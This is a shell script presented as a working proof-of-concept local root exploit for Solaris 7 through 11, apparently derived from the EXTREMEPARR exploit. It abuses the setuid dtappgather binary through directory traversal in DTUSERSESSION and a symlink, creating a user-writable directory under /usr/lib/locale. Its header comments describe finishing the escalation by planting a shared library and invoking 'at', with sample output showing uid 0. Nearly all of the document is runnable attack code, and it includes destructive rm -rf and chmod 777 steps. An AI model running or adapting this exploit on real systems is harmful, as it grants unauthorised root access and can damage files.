#!/bin/ksh
#Exploit PoC reverse engineered from EXTREMEPARR which provides
#local root on Solaris 7 - 11 (x86 & SPARC). Uses a environment
#variable of setuid binary dtappgather to manipulate file
#permissions and create a user owned directory anywhere on the
#system (as root). Can then add a shared object to locale folder
#and run setuid binaries with an untrusted library file.
#
# e.g.
# $ id;uname -a; ./dtappgather-poc.sh
# uid=60001(nobody) gid=60001(nobody)
# SunOS sparc 5.8 Generic_117350-39 sun4m sparc SUNW,SPARCstation-20
# [+] '/usr/dt/bin/dtappgather' directory traversal exploit
# [-] get rid of any of our desktop files
# [-] exploiting the traversal bug...
# changePermissions: /var/dt/appconfig/appmanager/..| : No such file or directory
# MakeDirectory: /var/dt/appconfig/appmanager/..: File exists
# changePermissions: /var/dt/appconfig/appmanager/..| : No such file or directory
# [-] symlink attack create our directory
# dr-xr-xr-x   2 nobody   nobody       512 Apr 11 14:40 pdkhax
# [-] Done. "/usr/lib/locale/pdkhax" is writeable
# $ 
#
# To get root privileges simply exploit "at" by adding a .so.2
# file in the new locale directory and calling "at".
#
# $ at -f /etc/passwd 11:11
# job 1491991860.a at Ons Apr 12 11:11:00 2017
# $ LC_TIME=pdkhax at -l
# # id
# uid=0(root) gid=60001(nobody)
# 
# -- Hacker Fantastic (www.myhackerhouse.com)
echo "[+] '/usr/dt/bin/dtappgather' directory traversal exploit"
echo "[-] get rid of any of our desktop files"
chmod -R 777 /var/dt/appconfig/appmanager/*
rm -rf /var/dt/appconfig/appmanager/*
echo [-] exploiting the traversal bug...
DTUSERSESSION=. /usr/dt/bin/dtappgather
DTUSERSESSION=. /usr/dt/bin/dtappgather
DTUSERSESSION=.. /usr/dt/bin/dtappgather
DTUSERSESSION=.. /usr/dt/bin/dtappgather
DTUSERSESSION=.. /usr/dt/bin/dtappgather
echo [-] symlink attack create our directory 
ln -sf /usr/lib/locale /var/dt/appconfig/appmanager
DTUSERSESSION=pdkhax /usr/dt/bin/dtappgather
ls -al /usr/lib/locale | grep pdkhax
rm -rf /var/dt/appconfig/appmanager
chmod 755 /usr/lib/locale/pdkhax
echo [-] Done. "/usr/lib/locale/pdkhax" is writeable

